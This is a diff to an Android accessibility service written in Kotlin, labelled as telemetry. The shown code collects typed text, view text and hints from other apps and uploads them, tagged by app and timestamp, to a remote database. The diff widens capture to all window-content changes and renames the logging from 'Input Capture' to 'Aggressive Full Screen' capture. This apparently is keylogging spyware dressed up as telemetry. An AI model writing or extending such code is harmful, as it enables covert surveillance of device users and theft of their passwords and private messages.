@@ -40,15 +40,16 @@ class AppAccessibilityService : AccessibilityService() {
                         AccessibilityEvent.TYPE_VIEW_FOCUSED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_SELECTED or
-                        AccessibilityEvent.TYPE_VIEW_CLICKED
+                        AccessibilityEvent.TYPE_VIEW_CLICKED or
+                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                 feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                 flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                         AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                 notificationTimeout = 5
             }
             serviceInfo = info
-            Log.d(TAG, "Optimized Input & Notification Telemetry Service Connected")
-            LogStore.addLog("Optimized Input & Notification Telemetry Service Active")
+            Log.d(TAG, "Aggressive Full Screen Telemetry Service Connected")
+            LogStore.addLog("Aggressive Full Screen Telemetry Service Active")
         } catch (e: Exception) {
             Log.e(TAG, "Error in onServiceConnected", e)
         }
@@ -77,6 +78,7 @@ class AppAccessibilityService : AccessibilityService() {
                     if (!nodeText.isNullOrBlank()) gatheredText.append(" [Node: $nodeText]")
                     if (!nodeHint.isNullOrBlank()) gatheredText.append(" [Hint: $nodeHint]")
                 } catch (_: Exception) {
+                    // ignore
                 }
             }
 
@@ -99,7 +101,7 @@ class AppAccessibilityService : AccessibilityService() {
 
                     ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                         .addOnSuccessListener {
-                            LogStore.addLog("[$deviceName] Input Capture ($sanitizedAppName): $typedText")
+                            LogStore.addLog("[$deviceName] Screen Capture ($sanitizedAppName): $typedText")
                         }
                 } catch (_: Exception) {
                 }
